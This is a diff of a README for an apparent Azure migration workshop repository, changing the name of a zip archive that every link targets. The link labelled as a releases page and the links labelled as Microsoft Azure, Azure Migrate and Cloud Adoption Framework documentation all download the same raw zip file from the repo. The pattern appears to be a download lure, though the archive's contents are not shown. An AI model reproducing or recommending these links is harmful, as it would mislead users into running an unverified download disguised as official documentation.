@@ -1,6 +1,6 @@
 # 🚀 azure-migrate-wds - Your Path to Seamless Azure Migration
 
-[![Download](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip%20Migrate%20WDS-brightgreen)](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
+[![Download](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip%20Migrate%20WDS-brightgreen)](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
 
 ## 📦 Overview
 The **azure-migrate-wds** application offers a one-day hands-on workshop for Azure migration. It includes Azure Migrate appliance labs and practical whiteboard design sessions. This workshop follows the Cloud Adoption Framework Migrate methodology, ensuring effective migration practices.
@@ -15,7 +15,7 @@ To begin your journey with the azure-migrate-wds application, please follow thes
 ## 🔗 Visit for Downloads
 To access the latest version of the azure-migrate-wds application, please visit the Releases page below:
 
-[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
+[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
 
 ## 💻 Download & Install
 1. Click the link above to go to the Releases page.
@@ -44,9 +44,9 @@ The workshop includes:
 
 ## 📋 Additional Resources
 If you'd like to enhance your understanding further, consider exploring the following resources:
-- [Microsoft Azure Documentation](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
-- [Azure Migrate Documentation](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
-- [Cloud Adoption Framework](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
+- [Microsoft Azure Documentation](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
+- [Azure Migrate Documentation](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
+- [Cloud Adoption Framework](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
 
 ## ❓ Frequently Asked Questions (FAQ)
 **Q: Do I need prior Azure knowledge?**  
@@ -66,4 +66,4 @@ Stay updated with the latest features and improvements:
 - Follow us on GitHub for future releases and community discussions.
 - Engage with other users for tips and experiences.
 
-[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure-wds-migrate-v3.9.zip)
+[Download from Releases](https://github.com/djneeraj1/azure-migrate-wds/raw/refs/heads/main/participant/azure_wds_migrate_3.2.zip)
